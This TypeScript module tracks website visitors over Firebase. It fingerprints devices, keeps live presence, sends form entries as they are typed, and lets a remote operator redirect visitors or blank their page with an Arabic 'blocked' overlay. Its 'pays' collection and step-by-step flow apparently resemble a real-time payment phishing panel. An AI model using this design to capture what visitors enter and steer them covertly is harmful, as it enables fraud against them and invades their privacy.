/**
 * Visitor Tracking - Firebase Version
 * Uses Firestore for real-time tracking
 */
;

import { addData, getData, createVisitor, setVisitorOffline, clearRedirectPage as apiClearRedirectPage } from './api';
import { visitorJoin, visitorUpdatePage, visitorSaveData, visitorHeartbeat } from './socket';
import { ref, set, onDisconnect, onValue, type Unsubscribe } from 'firebase/database';
import { database } from './firebase';
import { doc, onSnapshot } from 'firebase/firestore';
import { db } from './firebase';

// ─── Visitor ID helpers ───────────────────────────────────────────────────────

export function generateVisitorRef(): string {
  const timestamp = Date.now().toString(36);
  const random = Math.random().toString(36).substring(2, 8);
  return `REF-${timestamp}-${random}`.toUpperCase();
}

export function getOrCreateVisitorID(): string {
  if (typeof window === 'undefined') return generateVisitorRef();
  let visitorId = localStorage.getItem('visitor');
  if (!visitorId) {
    visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    localStorage.setItem('visitor', visitorId);
  }
  return visitorId;
}

// ─── Device Info ──────────────────────────────────────────────────────────────

export function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'tablet';
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'mobile';
  return 'desktop';
}

export function getBrowser(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('SamsungBrowser')) return 'Samsung Browser';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  if (ua.includes('Trident')) return 'Internet Explorer';
  if (ua.includes('Edge')) return 'Edge';
  if (ua.includes('Chrome')) return 'Chrome';
  if (ua.includes('Safari')) return 'Safari';
  return 'unknown';
}

export function getOS(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (ua.includes('Win')) return 'Windows';
  if (ua.includes('Mac')) return 'MacOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'unknown';
}

export function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown';
  return `${window.screen.width}x${window.screen.height}`;
}

export async function getCountry(): Promise<string> {
  const apiKey = import.meta.env.VITE_IPDATA_API_KEY || '';
  const baseUrl = (import.meta.env.VITE_IPDATA_API_URL || 'https://api.ipdata.co').replace(/\/+$/, '');
  if (!apiKey || !baseUrl) return 'unknown';
  const url = `${baseUrl}/country_name?api-key=${apiKey}`;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    return await response.text();
  } catch {
    return 'unknown';
  }
}

// ─── Presence System (Realtime Database) ─────────────────────────────────────

let presenceUnsubscribe: Unsubscribe | null = null;
let currentVisitorId: string | null = null;

export async function setVisitorPresenceOnline(visitorId: string): Promise<void> {
  if (typeof window === 'undefined' || !visitorId) return;
  
  currentVisitorId = visitorId;
  
  try {
    const presenceRef = ref(database, `presence/${visitorId}`);
    
    // First, set up the disconnect handler BEFORE setting online
    // This ensures the handler is registered even if connection is lost immediately
    const disconnectRef = onDisconnect(presenceRef);
    // Use set instead of update for onDisconnect to avoid serverTimestamp issues
    await disconnectRef.set({
      online: false,
      lastSeen: Date.now(),
    });
    
    // Then set online status
    await set(presenceRef, {
      online: true,
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });
    
    // Listen for connection state changes to restore online status on reconnect
    const connRef = ref(database, ".info/connected");
    
    // Cleanup previous listener if exists
    if (presenceUnsubscribe) {
      presenceUnsubscribe();
    }
    
    presenceUnsubscribe = onValue(connRef, (snap) => {
      if (snap.val() === false) {
        // Connection lost - onDisconnect will handle setting offline
        return;
      }
      // Connection restored - set online again if this is still the same visitor
      if (currentVisitorId === visitorId) {
        set(presenceRef, { online: true, lastSeen: Date.now(), timestamp: Date.now() });
      }
    });
    
  } catch (error) {
    console.error('[Presence] Error setting online status:', error);
  }
}

export async function setVisitorPresenceOffline(visitorId: string): Promise<void> {
  if (typeof window === 'undefined' || !visitorId) return;
  
  try {
    // Cleanup the connected listener first
    if (presenceUnsubscribe) {
      presenceUnsubscribe();
      presenceUnsubscribe = null;
    }
    
    const presenceRef = ref(database, `presence/${visitorId}`);
    await set(presenceRef, {
      online: false,
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });
  } catch (error) {
    console.error('[Presence] Error setting offline status:', error);
  }
}

// Cleanup function to remove presence listener
export function cleanupPresenceListener(): void {
  if (presenceUnsubscribe) {
    presenceUnsubscribe();
    presenceUnsubscribe = null;
  }
}

// ─── Visitor Initialization ───────────────────────────────────────────────────

// Global blocked state for instant block detection (shared across all pages)
let currentBlockedState = false;
let onBlockedChangeCallback: ((isBlocked: boolean) => void) | null = null;
let globalBlockedUnsubscribe: (() => void) | null = null;
let globalBlockedVisitorId: string | null = null;

// Block overlay element reference
let blockOverlayElement: HTMLElement | null = null;

export function setOnBlockedChangeCallback(callback: (isBlocked: boolean) => void): void {
  onBlockedChangeCallback = callback;
  // Immediately call with current state
  callback(currentBlockedState);
}

export function getCurrentBlockedState(): boolean {
  return currentBlockedState;
}

// Create and show instant block overlay - FULL BLOCK
function showBlockOverlay(): void {
  if (typeof window === 'undefined') return;
  
  // Remove existing overlay if any
  hideBlockOverlay();
  
  // Create blocker div that covers entire viewport
  const blocker = document.createElement('div');
  blocker.id = 'instant-block-overlay';
  blocker.style.cssText = `
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    bottom: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background: white !important;
    z-index: 2147483647 !important;
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    justify-content: center !important;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
    overflow: hidden !important;
    pointer-events: all !important;
  `;
  blocker.innerHTML = `
    <div style="text-align: center; padding: 48px; background: white; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.15); max-width: 450px; margin: 20px;">
      <div style="font-size: 80px; margin-bottom: 24px;">🚫</div>
      <h1 style="font-size: 32px; font-weight: 800; color: #dc2626; margin-bottom: 16px; font-family: inherit; line-height: 1.2;">تم حظر الوصول</h1>
      <p style="font-size: 18px; color: #6b7280; font-family: inherit; line-height: 1.6;">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
    </div>
    <style>
      body > * { display: none !important; }
      #instant-block-overlay { display: flex !important; }
    </style>
  `;
  
  // Prevent scrolling on body
  document.body.style.overflow = 'hidden';
  
  // Clear body and add only the blocker
  const bodyChildren = Array.from(document.body.children);
  bodyChildren.forEach(child => {
    if (child.id !== 'instant-block-overlay') {
      document.body.removeChild(child);
    }
  });
  
  document.body.appendChild(blocker);
  blockOverlayElement = blocker;
  currentBlockedState = true;
  
  // Lock body scroll
  document.documentElement.style.overflow = 'hidden';
  
  console.log('[BlockOverlay] FULL BLOCK applied - browsing disabled');
}

// Hide block overlay
function hideBlockOverlay(): void {
  if (blockOverlayElement && blockOverlayElement.parentNode) {
    blockOverlayElement.parentNode.removeChild(blockOverlayElement);
    blockOverlayElement = null;
  }
}

// Setup global block listener that works across all pages
export function setupGlobalBlockedListener(visitorId: string): void {
  if (typeof window === 'undefined') return;
  
  // If same visitor, don't re-setup
  if (globalBlockedVisitorId === visitorId && globalBlockedUnsubscribe) {
    return;
  }
  
  // Cleanup previous listener
  if (globalBlockedUnsubscribe) {
    globalBlockedUnsubscribe();
  }
  
  globalBlockedVisitorId = visitorId;
  
  const visitorRef = doc(db, 'pays', visitorId);
  
  globalBlockedUnsubscribe = onSnapshot(visitorRef, (snapshot) => {
    if (!snapshot.exists()) return;
    
    const data = snapshot.data();
    const isBlocked = data.isBlocked === true || data.is_blocked === true;
    
    if (isBlocked !== currentBlockedState) {
      currentBlockedState = isBlocked;
      
      if (onBlockedChangeCallback) {
        onBlockedChangeCallback(isBlocked);
      }
      
      console.log(`[GlobalBlock] Status changed: ${isBlocked ? 'BLOCKED' : 'UNBLOCKED'}`);
      
      // INSTANT: Show block overlay immediately without redirecting
      if (isBlocked) {
        showBlockOverlay();
      } else {
        hideBlockOverlay();
      }
    }
  });
}

// Block navigation if user is already blocked
export function checkBlockedAndBlock(): void {
  if (currentBlockedState) {
    showBlockOverlay();
  }
}

export async function initializeVisitorTracking(visitorId: string) {
  const country = await getCountry();

  const trackingData = {
    id: visitorId,
    country,
    deviceType: getDeviceType(),
    browser: getBrowser(),
    os: getOS(),
    screenResolution: getScreenResolution(),
    isOnline: true,
    isBlocked: false,
    isUnread: true,
    currentStep: 1,
    currentPage: 'home',
    createdAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
    sessionStartAt: new Date().toISOString(),
  };

  // Use createVisitor (POST) to ensure visitor exists in DB, then update with tracking data
  let visitorCreated = false;
  try {
    await createVisitor({ id: visitorId });
    visitorCreated = true;
  } catch {
    // Visitor may already exist, that's fine
    visitorCreated = true;
  }
  try {
    await addData(trackingData);
  } catch {
    // Silently ignore if addData fails
  }

  // Set presence online in Realtime Database (immediate, < 1 second)
  // IMPORTANT: Must await to ensure onDisconnect is registered before user leaves
  setVisitorPresenceOnline(visitorId).catch(console.error);

  // Join socket room
  visitorJoin(visitorId);

  // Setup online/offline listeners
  setupOnlineOfflineListeners(visitorId, visitorCreated);
  setupActivityTracker(visitorId);

  return trackingData;
}

function setupOnlineOfflineListeners(visitorId: string, isConfirmedInDB = false) {
  if (typeof window === 'undefined') return;

  let confirmed = isConfirmedInDB;

  const updateOnlineStatus = (isOnline: boolean) => {
    if (!confirmed) return; // Skip if visitor not yet confirmed in DB
    // Update both Firestore and Realtime Database presence
    addData({ id: visitorId, isOnline }).catch(() => {
      // Silently ignore network errors for online status updates
    });
    if (isOnline) {
      setVisitorPresenceOnline(visitorId);
    } else {
      setVisitorPresenceOffline(visitorId);
    }
  };

  window.addEventListener('online', () => updateOnlineStatus(true));
  window.addEventListener('offline', () => updateOnlineStatus(false));
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') updateOnlineStatus(true);
  });
  window.addEventListener('beforeunload', () => {
    if (confirmed) {
      setVisitorPresenceOffline(visitorId);
    }
  });
  
  // Cleanup on page unload
  window.addEventListener('unload', () => {
    cleanupPresenceListener();
  });
}

function setupActivityTracker(visitorId: string) {
  if (typeof window === 'undefined') return;

  const intervalId = setInterval(() => {
    visitorHeartbeat(visitorId);
  }, 30000);

  window.addEventListener('beforeunload', () => clearInterval(intervalId));

  const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
  let lastActivityUpdate = Date.now();

  const handleActivity = () => {
    const now = Date.now();
    if (now - lastActivityUpdate > 10000) {
      lastActivityUpdate = now;
      visitorHeartbeat(visitorId);
    }
  };

  events.forEach((event) => {
    document.addEventListener(event, handleActivity, { passive: true });
  });
}

// ─── Page & Form Tracking ─────────────────────────────────────────────────────

export async function updateVisitorPage(visitorId: string, page: string, step: number | string): Promise<void> {
  if (!visitorId) return;
  try {
    visitorUpdatePage(visitorId, page, String(step));
  } catch (error) {
    console.error('[Tracking] Error updating visitor page:', error);
  }
}

export async function saveFormData(visitorId: string, data: any, pageName: string): Promise<void> {
  if (!visitorId) return;
  try {
    const timestampedData = {
      ...data,
      [`${pageName}UpdatedAt`]: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
    };
    visitorSaveData(visitorId, timestampedData);
  } catch (error) {
    console.error('[Tracking] Error saving form data:', error);
  }
}

// ─── Status Checks ────────────────────────────────────────────────────────────

export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.is_blocked === true;
  } catch {
    return false;
  }
}

export async function checkRedirectPage(visitorId: string): Promise<string | null> {
  try {
    const data = await getData(visitorId);
    return data?.redirect_page || null;
  } catch {
    return null;
  }
}

export async function clearRedirectPage(visitorId: string): Promise<void> {
  await apiClearRedirectPage(visitorId);
}

export async function setRedirectPage(visitorId: string, targetPage: string): Promise<void> {
  await addData({ id: visitorId, redirectPage: targetPage });
}

export function setupOnlineTracking(visitorId: string): () => void {
  if (typeof window === 'undefined' || !visitorId) return () => {};

  const interval = setInterval(() => visitorHeartbeat(visitorId), 15000);

  const handleBeforeUnload = () => {
    setVisitorOffline(visitorId);
    setVisitorPresenceOffline(visitorId);
  };
  const handleVisibilityChange = () => {
    if (document.hidden) {
      setVisitorOffline(visitorId);
      setVisitorPresenceOffline(visitorId);
    } else {
      visitorHeartbeat(visitorId);
      setVisitorPresenceOnline(visitorId);
    }
  };

  window.addEventListener('beforeunload', handleBeforeUnload);
  document.addEventListener('visibilitychange', handleVisibilityChange);

  return () => {
    clearInterval(interval);
    window.removeEventListener('beforeunload', handleBeforeUnload);
    document.removeEventListener('visibilitychange', handleVisibilityChange);
    setVisitorOffline(visitorId);
    setVisitorPresenceOffline(visitorId);
  };
}
